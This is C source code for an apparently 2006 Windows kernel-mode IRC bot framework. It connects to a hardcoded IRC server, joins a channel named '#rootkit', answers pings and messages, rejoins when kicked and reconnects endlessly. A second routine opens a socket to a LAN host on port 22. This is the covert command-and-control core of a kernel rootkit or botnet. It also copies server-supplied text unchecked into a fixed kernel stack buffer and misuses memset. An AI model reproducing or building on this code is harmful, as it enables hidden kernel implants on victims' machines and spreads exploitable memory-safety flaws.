/*
	Kernel Ircbot Framework
    (c) Tibbar 2006.  If you wish to use this code in your own project please contact me
	at tibbar@tibbar.org to obtain permission.
*/

#include "KIrcBot.h"

#ifdef KERNELMODE
extern unsigned long inet_addr(IN const char *cp);
extern unsigned short htons (IN unsigned short hostshort);
#define sockaddr struct sockaddr_in         
#else
#include "winsock.h"
#endif


char serverIp[] = "207.126.116.14";
USHORT port = 6667;
char userString[] = "USER Kernelbot tibb tibb tibb\n";
char nickString[] = "NICK Kernelbot\n";
char nick[] = "Kernelbot";
char channel[] = "#rootkit";
char joinString[] = "JOIN #rootkit\n";

BOOL in_channel = FALSE;
BOOL registeredUserWithServer = FALSE;
BOOL registeredNickWithServer = FALSE;
int didItSend = 0;

BOOL irc_parseline(PKSOCKET pKSocket, char* readBufferLine)
{
	// pong if we get a ping request from the server
		
	if (strstr(readBufferLine, "PING :") != 0) 
	{
		// then look for a ":" and extract text after it
		char* search = strstr(readBufferLine, ":")+1;
		char reply[256];
		strcpy(reply, "PONG ");
		strcat(reply, search);
		strcat(reply, "\r\n");
		didItSend = send(pKSocket, reply, strlen(reply),0);
		if(didItSend !=0) return FALSE;
		DbgPrint(reply);
		if (in_channel == FALSE) 
		{
			didItSend = send(pKSocket, joinString, strlen(joinString),0);
			if(didItSend !=0) return FALSE;
			DbgPrint(joinString);
			in_channel = TRUE;
		}
	}
	if (strstr(readBufferLine, nick) != 0 && strstr(readBufferLine, "PRIVMSG") != 0) 
	{
		// then look for a ":" and extract text after it
		char reply[256];
		strcpy(reply, "PRIVMSG ");
		strcat(reply, channel);
		strcat(reply, " :Hello, i'm a kernel bot :D\r\n"  );
		didItSend = send(pKSocket, reply, strlen(reply),0);
		if(didItSend !=0) return FALSE;
		DbgPrint(reply);
	}
	if (strstr(readBufferLine, nick) != 0 && strstr(readBufferLine, "KICK") != 0) 
	{
		didItSend = send(pKSocket, joinString, strlen(joinString),0);
		if(didItSend !=0) return FALSE;
		DbgPrint(joinString);
		in_channel = TRUE;
	}
	return TRUE;
}


void irc_connect(PKSOCKET pKSocket)
{
	struct sockaddr_in socketAddress;
	int didItWork = -1;
	LARGE_INTEGER waitTime;
	char* readBuffer = NULL;
	SIZE_T ReceivedBytes = 0;
	NTSTATUS didReadWork = STATUS_SUCCESS;
	BOOL didItParse = TRUE;

	waitTime.QuadPart= RELATIVE(MILLISECONDS(500));

	socketAddress.sin_family = AF_INET;
	socketAddress.sin_addr.S_un.S_addr = inet_addr(serverIp);
	socketAddress.sin_port = htons(port);

	didItWork = connect( pKSocket, &socketAddress,sizeof(socketAddress));
	if(didItWork == 0)
	{
		//readBuffer = (char*) KSocketAllocatePool();
#undef PAGE_SIZE
#define PAGE_SIZE 1000
		readBuffer = (char*) ExAllocatePoolWithTag(PagedPool, PAGE_SIZE,'tnec');

		//DbgBreakPoint();

		if(readBuffer == NULL) return;
		while(TRUE)
		{
			memset(readBuffer, 0, sizeof(readBuffer));
			// if recv() returns 0, that means that the connection has been lost.
			didReadWork = KSocketReadLine(pKSocket, readBuffer, PAGE_SIZE, &ReceivedBytes);
			if(didReadWork != STATUS_SUCCESS) 
			{
				//DbgBreakPoint();
				break; // && didReadWork != STATUS_NO_DATA_DETECTED) break; 
			}
			DbgPrint(readBuffer);
	
			if(registeredUserWithServer == FALSE)
			{
				int didItWork = send(pKSocket, userString, strlen(userString),0);
				if(didItWork != 0) break;
				DbgPrint(userString);
				registeredUserWithServer = TRUE;
			}
			if(registeredNickWithServer == FALSE)
			{
				int didItWork = send(pKSocket, nickString, strlen(nickString),0);
				if(didItWork != 0) break;
				DbgPrint(nickString);
				registeredNickWithServer = TRUE;
			}
			//if (recv(pKSocket, readBuffer, sizeof(readBuffer), 0) <= 0) break;
			didItParse = irc_parseline(pKSocket, readBuffer);
			if(didItParse == FALSE) break;
			KeDelayExecutionThread(KernelMode, FALSE, &waitTime);
		}
			
		ExFreePoolWithTag((PVOID)readBuffer, 'tnec');
		registeredNickWithServer = FALSE;
		registeredUserWithServer = FALSE;
		in_channel = FALSE;
		
	
	}
}

void irc_initialise()
{
	BOOL socketInitialiseSuccess = FALSE;
	PKSOCKET pKSocket = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	LARGE_INTEGER waitTime;
	waitTime.QuadPart= RELATIVE(SECONDS(60));

	// initialise KSocket library
	while(1)
	{
		socketInitialiseSuccess = KSocketInitialize();
		if(socketInitialiseSuccess == TRUE)
		{
			while(1)
			{
				pKSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
				if(KSocketGetLastError() == STATUS_SUCCESS) 
				{		
					DbgPrint("socket created");
					irc_connect(pKSocket);
					//DbgBreakPoint();
				}
				shutdown(pKSocket,0);
			}
			KeDelayExecutionThread(KernelMode, FALSE, &waitTime);
		}
		KeDelayExecutionThread(KernelMode, FALSE, &waitTime);
		
	}
}



void OpenListener()
{
	BOOL socketInitialiseSuccess = FALSE;
	PKSOCKET pKSocket = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	struct sockaddr_in socketAddress;

	// initialise KSocket library
	socketInitialiseSuccess = KSocketInitialize();

	if(socketInitialiseSuccess  == TRUE) DbgPrint("socket initalised");
	if(socketInitialiseSuccess  != TRUE) DbgPrint("socket failed to initalise");

	pKSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(KSocketGetLastError() == STATUS_SUCCESS)
	{
		DbgPrint("socket created");
			
		socketAddress.sin_family = AF_INET;
		socketAddress.sin_addr.S_un.S_addr = inet_addr("192.168.1.103");
		socketAddress.sin_port = htons(22);

		connect(pKSocket, &socketAddress,0);
		status = KSocketGetLastError();
		if(status == STATUS_SUCCESS) DbgPrint("socket connected");
		if(status == STATUS_TIMEOUT) DbgPrint("socket timedout");
		if(status != STATUS_SUCCESS) DbgPrint("socket connect failed");

	}
}
